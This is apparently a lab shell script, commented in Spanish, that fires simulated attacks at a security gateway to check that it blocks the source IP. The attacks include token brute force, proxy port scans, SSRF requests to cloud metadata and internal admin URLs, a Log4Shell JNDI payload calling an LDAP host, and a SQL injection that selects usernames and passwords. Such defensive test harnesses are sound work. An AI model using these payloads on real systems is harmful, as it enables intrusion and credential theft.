#!/bin/sh
# Un ataque del laboratorio. simular-ataques-lab.ps1 lanza cada uno desde su propia IP.
# Los bucles se detienen en cuanto el gateway deja de responder: la IP ya está bloqueada.

GATEWAY=10.77.0.10
PROXY=http://$GATEWAY:3128
ADMIN=http://$GATEWAY:9128
ORIGEN=http://rayo-origen:8099

code() { curl -s -o /dev/null -w '%{http_code}' --connect-timeout 3 --max-time 5 "$@"; }

# repetir N comando...: lo ejecuta N veces y resume cuántas respuestas hubo antes del bloqueo.
repetir() {
    total=$1; shift
    i=0; last=''
    while [ "$i" -lt "$total" ]; do
        i=$((i + 1))
        last=$("$@")
        if [ "$last" = 000 ]; then
            echo "Intento $i sin respuesta: el gateway ya bloqueó esta IP."
            return
        fi
    done
    echo "$total intentos. Última respuesta: $last."
}

intento_token() { code -H "Authorization: Bearer intento-$i" "$ADMIN/api/summary"; }

case "$1" in
comprobar)
    code -x "$PROXY" "$ORIGEN/static.js"
    ;;
intruso)
    repetir 8 code -x "$PROXY" "$ORIGEN/static.js"
    ;;
fuerza-bruta)
    repetir 12 intento_token
    ;;
escaneo-proxy)
    for port in 22 25 445 1433 3306 3389; do
        echo "Puerto $port -> $(curl -s -o /dev/null -w '%{http_connect}' --connect-timeout 3 --max-time 5 -x "$PROXY" -p "http://example.invalid:$port/")"
    done
    ;;
ssrf)
    # Los metadatos, al final: es un ataque probable y bloquea la IP en el acto.
    for target in http://wazuh.manager:55000/ http://10.0.0.1/admin http://169.254.169.254/latest/meta-data/; do
        echo "$target -> $(code -x "$PROXY" "$target")"
    done
    ;;
inundacion)
    repetir 200 code -x "$PROXY" "$ORIGEN/static.js"
    ;;
nombre-suplantado)
    echo "Respuesta: $(code -x "$PROXY" -H 'Host: banco.invalid' "$ORIGEN/static.js")"
    ;;
escaneo-red)
    nmap -sS -Pn -n -T4 --max-retries 1 -p 1-1000 "$GATEWAY" | grep -E '^[0-9]+/tcp|filtered|closed' | head -5
    ;;
log4shell)
    echo "Respuesta del proxy: $(code -x "$PROXY" -H 'User-Agent: ${jndi:ldap://10.77.0.55:1389/a}' "$ORIGEN/static.js")"
    ;;
sqli)
    echo "Respuesta del proxy: $(code -x "$PROXY" -A 'sqlmap/1.8' "$ORIGEN/productos?id=1%20UNION%20SELECT%20usuario,clave%20FROM%20usuarios")"
    ;;
*)
    echo "Ataque desconocido: $1" >&2
    exit 2
    ;;
esac
